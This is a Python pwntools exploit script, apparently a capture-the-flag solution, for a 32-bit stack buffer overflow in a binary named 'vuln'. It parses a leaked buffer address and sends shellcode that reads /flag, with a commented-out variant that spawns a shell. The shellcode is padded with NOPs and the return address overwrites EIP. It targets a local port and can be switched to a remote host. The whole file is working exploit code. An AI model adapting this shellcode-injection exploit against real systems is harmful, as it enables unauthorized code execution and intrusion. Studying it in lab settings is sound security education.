from pwn import *
import re


context.log_level = 'debug'
context.arch = 'i386'

def extract_buffer_address(output_bytes):
    match = re.search(rb'0x[0-9a-fA-F]+', output_bytes)
    if match:
        return int(match.group(0), 16)
    return None


def getPayload(ret_addr):
    shellcode = asm(shellcraft.cat('/flag'))
    #shellcode = asm(shellcraft.sh())
    shellcode += asm(shellcraft.exit())

    cyclic_str='aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaAAAAAAAAAAAAAAAA'
    # last 4 A chars write in the EIP

    padding=len(cyclic_str)-len(shellcode)-4

    payload=flat(
        shellcode,
        asm('nop')*padding,
        ret_addr
    )

    write("payload", payload)
    return payload


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
exe = '../forUser/vuln'

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
    
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'


#io = start()
io=remote('127.0.0.1',4444)

print(io.readline())    #   b'My cup runneth over\n'

print(io.readline())    #   b'Like blood from a stone...\n'
print(io.readline())    #   b'\n'
s=io.readline()  #   b'Buffer starts here 0xfffe30be\n'
ret_addr=extract_buffer_address(s);print(f'ret_adr: {hex(ret_addr)}')

io.sendlineafter(b'Try and get the flag\n', getPayload(ret_addr))
io.interactive()